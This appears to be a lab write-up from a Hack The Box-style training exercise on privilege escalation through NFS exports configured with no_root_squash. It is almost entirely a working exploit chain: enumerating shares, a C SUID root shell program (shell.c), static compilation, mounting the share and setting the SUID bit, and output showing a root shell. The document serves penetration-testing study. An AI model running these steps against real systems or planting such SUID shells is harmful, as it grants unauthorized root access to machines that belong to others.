# Weak NFS Privileges

## Available Shares

```sh
my@attack:~$ showmount -e 10.129.2.210
```

```output title="Output"
Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *
```

## Access Control List

| OPTION | SUID USAGE |
|---|---|
| root_squash ||
| no_root_squash | + |

```sh
htb-student@NIX02:~$ cat /etc/exports
```

```output title="Output" hl_lines="12"
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

## Malicious Code

```c title="shell.c" linenums="1"
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

## Compilation

```sh
my@attack:~$ gcc -static -o shell shell.c
```

## Transferring the Binary

```sh
my@attack:~$ sudo mount -t nfs 10.129.2.210:/tmp /mnt
my@attack:~$ sudo cp shell /mnt
my@attack:~$ sudo chmod u+s /mnt/shell
```

## SUID Check

```sh
htb-student@NIX02:~$ ls -l /tmp/shell
```

```output title="Output"
-rwsr-xr-x 1 root root 789672 May 18 12:01 /tmp/shell
```

## Privileged Shell

```sh
htb-student@NIX02:~$ /tmp/shell
root@NIX02:~# id
```

```output title="Output"
uid=0(root) gid=0(root) groups=0(root),1008(htb-student)
```
